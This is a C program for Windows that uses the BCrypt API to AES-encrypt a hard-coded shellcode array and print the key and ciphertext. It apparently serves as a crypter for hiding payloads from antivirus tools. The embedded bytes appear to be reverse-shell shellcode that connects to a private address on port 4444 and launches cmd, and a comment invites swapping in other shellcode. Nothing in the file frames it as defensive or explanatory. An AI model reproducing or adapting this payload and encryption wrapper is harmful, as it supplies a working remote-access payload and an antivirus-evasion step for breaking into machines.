# include <windows.h>
# include <stdio.h>
# include <bcrypt.h>


static const BYTE secret[] =
{
    0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x69, 0x73, 0x73, 
    0x73, 0x73, 0x73, 0x73, 0x73, 0x73, 0x73, 0x73
};

//change the shellcode here
unsigned char plaintext[]={0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xe8,0x80,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x00,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x01,0x01,0x8d,0x44,0x24,0x10,0xc6,0x00,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5};


int main()
{
   BCRYPT_ALG_HANDLE phalgorithm;
   LPCWSTR pszAlgId=L"AES";
   LPCWSTR pszImplementation=NULL;

   BCRYPT_KEY_HANDLE phkey;
   DWORD pbOutput;
   LPCWSTR pszProperty = L"ObjectLength";
   ULONG dwFlags=0;
   ULONG pcbresult;


   HANDLE getprocessheap=GetProcessHeap();
   LPVOID heapmemoryKey;
   DWORD ciphertext_size = 0;

   LPVOID heapmemory_plaintext,heapmemory_ciphertext;
   PUCHAR ciphertext;
   ULONG pcbresult_finalencryption;
   NTSTATUS status;
   DWORD dwStatusError=GetLastError();

   ULONG pcbresult_key;
   ULONG pcbresult_keynew;

   if((status=BCryptOpenAlgorithmProvider(&phalgorithm,BCRYPT_AES_ALGORITHM,NULL,0)) != 0){
       printf("[+] Error Occured while Getting Handle to CSP: %X\n",status);
       exit(0);
   }
   if((status=BCryptGetProperty(phalgorithm,BCRYPT_OBJECT_LENGTH,(PUCHAR)&pbOutput,sizeof(DWORD),&pcbresult,dwFlags)) !=0) {
       printf("[+] Error Occured while Getting Key property of Algorithm: %X\n",status);
       exit(0);
    }
   heapmemoryKey=HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,pbOutput);

   printf("[+]Size of the Generated key is :%d\n",pbOutput);

  
   if((status=BCryptSetProperty(phalgorithm,BCRYPT_CHAINING_MODE,(PBYTE)BCRYPT_CHAIN_MODE_CBC,sizeof(BCRYPT_CHAIN_MODE_CBC),0)) != 0){
      printf("[+] Error Occured while setting property of Algorithm: %X\n",status);
      exit(0);
   }
   
   if((status=BCryptGenerateSymmetricKey(phalgorithm,&phkey,(PUCHAR)heapmemoryKey,(ULONG)pbOutput,(PUCHAR)secret,sizeof(secret),0)) != 0){
      printf("[+] Error Occured while Generating Keys: %X\n",status);
      exit(0);    
   }

   if((status=BCryptExportKey(phkey,NULL,BCRYPT_KEY_DATA_BLOB,NULL,0,&pcbresult_key,0)) !=0){
      printf("[+] Error: %X\n",status);
      exit(0);    
   }
   LPVOID heapmemory_key=HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,pcbresult_key);
   if((BCryptExportKey(phkey,NULL,BCRYPT_KEY_DATA_BLOB,(PUCHAR)heapmemory_key,pcbresult_key,&pcbresult_keynew,0)) !=0){
     printf("[+] Error Occured While Exporting the Keys: %X\n",status);
     exit(0);
   }
   printf("[+] Printing Key for Decrypting CipherText\n");
   for(int i=0;i<pcbresult_key;i++){
       printf("0x%02x,", ((PUCHAR)heapmemory_key)[i]);
   }
   printf("\n");
   // Allocating memory for plaintext
   heapmemory_plaintext=(PUCHAR)HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,(DWORD)sizeof(plaintext));

   //transferring buffer from plaintext to heapmemory_plaintext
   memcpy(heapmemory_plaintext,(CONST VOID*)&plaintext,sizeof(plaintext));

   //getting size of encrypted data
   
   if((status=BCryptEncrypt(phkey,(PUCHAR)heapmemory_plaintext,(ULONG)sizeof(plaintext),NULL,NULL,0,NULL,0,&ciphertext_size,BCRYPT_BLOCK_PADDING)) != 0){
       printf("[+] Error Occured while Gettign Size of encrypted Text : %X\n",status);
       exit(0);
   }
 
   heapmemory_ciphertext=HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,ciphertext_size);
   //encrypting the data
   if((status=BCryptEncrypt(phkey,(PUCHAR)heapmemory_plaintext,(ULONG)sizeof(plaintext),NULL,NULL,0,(PUCHAR)heapmemory_ciphertext,ciphertext_size,&pcbresult_finalencryption,BCRYPT_BLOCK_PADDING)) !=0){
       printf("[+] Error Occured while Encrypting the Text : %X\n",status);
       exit(0);        
   }
   
   printf("[+] Printing Encrypted Text\n");
   for (DWORD i = 0; i < ciphertext_size; i++) {
    printf("0x%02x,", ((PUCHAR)heapmemory_ciphertext)[i]); 
   }
  
    if(phalgorithm)
    {
        BCryptCloseAlgorithmProvider(phalgorithm,0);
    }

    if (phkey)    
    {
        BCryptDestroyKey(phkey);
    }


    if(heapmemory_plaintext)
    {
        HeapFree(GetProcessHeap(), 0, heapmemory_plaintext);
    }

    if(heapmemory_key)
    {
        HeapFree(GetProcessHeap(), 0, heapmemory_key);
    }

 
   return 1;
}



   


